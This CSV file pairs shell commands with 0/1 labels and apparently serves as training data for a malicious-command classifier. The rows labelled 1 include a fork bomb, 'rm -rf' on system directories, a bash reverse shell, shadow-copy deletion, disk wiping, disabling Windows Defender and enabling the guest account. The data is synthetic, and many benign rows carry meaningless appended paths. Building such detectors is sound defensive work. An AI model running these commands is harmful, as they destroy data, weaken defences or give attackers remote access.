command,label
pip install -r requirements.txt /tmp,0
:(){ :|:& };:,1
touch new_file.txt /var/www/html,0
touch new_file.txt,0
rm -rf /var,1
bash -i >& /dev/tcp/10.10.10.10/1234 0>&1,1
whoami,0
systemctl status ssh /home/user/docs,0
cd Documents,0
git commit -m 'Initial commit',0
docker ps /var/www/html,0
cat notes.txt ./dist,0
free -m ./dist,0
ip addr show /var/www/html,0
powershell -Command 'Get-Service',0
systemctl status ssh /tmp,0
ls -la /tmp,0
"cut -d',' -f2 user.csv ../backup",0
screen -S session1 /home/user/docs,0
journalctl -xe ./dist,0
gcc main.c -o main ./dist,0
git commit -m 'Initial commit' /var/www/html,0
df -h ../backup,0
wmic useraccount where name='guest' set disabled=false,1
dig example.com ./dist,0
unzip archive.zip /tmp,0
sudo yum install git /tmp,0
Get-Date,0
wmic process call create 'powershell.exe -enc ...',1
sudo yum install git,0
journalctl -xe /var/www/html,0
sudo yum install git ../backup,0
hostname -I /var/www/html,0
awk '{print $1}' data.csv /tmp,0
gcc main.c -o main ../backup,0
tee output.log /home/user/docs,0
vssadmin delete shadows /all /quiet,1
cipher /w:C:,1
hostname -I,0
dig example.com,0
patch < fix.patch /tmp,0
chmod 644 script.sh /home/user/docs,0
service nginx restart ../backup,0
reg delete 'HKLM\SYSTEM\CurrentControlSet\Control\Lsa' /v LSA_DEBUG /f,1
ionice -c 3 ./backup.sh,0
mv old.name new.name /home/user/docs,0
sudo yum install git ./dist,0
ipconfig /all,0
systemctl status ssh /var/www/html,0
taskkill /IM notepad.exe,0
net start w3svc,0
ansible-playbook site.yml,0
ls -R /var/www/html,0
sudo yum install git /var/www/html,0
cipher /w:D:,1
traceroute 8.8.8.8 ./dist,0
git init /home/user/docs,0
net stop browser,0
mv old.name new.name ./dist,0
cat notes.txt /var/www/html,0
Start-Process notepad.exe,0
rm -rf /root,1
man ls ../backup,0
powershell -Command 'Write-Host hello',0
del /f /s /q D:\*,1
netstat -tuln ../backup,0
free -m ../backup,0
rmdir empty_dir /home/user/docs,0
nslookup google.com,0
alias ll='ls -l' ../backup,0
docker images ./dist,0
echo 'hello' /var/www/html,0
service nginx restart /tmp,0
history | tail -n 20 /tmp,0
whoami /groups,0
locate secret.txt /home/user/docs,0
"net stop ""Windows Defender""",1
ps aux | grep python /tmp,0
awk '{print $1}' data.csv,0
shutdown -h now,1
sort -k3 items.txt,0
top -n 1 /var/www/html,0
userdel -r root,1
tmux attach ../backup,0
mv old.name new.name /var/www/html,0
net user guest /active:yes,1
pip install -r requirements.txt ./dist,0
wmic cpu get name,0
uname -a ../backup,0
patch < fix.patch,0
sudo apt update,0
ss -lptn,0
cat notes.txt /home/user/docs,0
ss -lptn /home/user/docs,0
ssh user@192.168.1.10,0
locate secret.txt,0
terraform apply ../backup,0
kubectl get pods,0
mount /dev/sdb1 /mnt,0
docker images /var/www/html,0
cp source.txt dest.txt /var/www/html,0
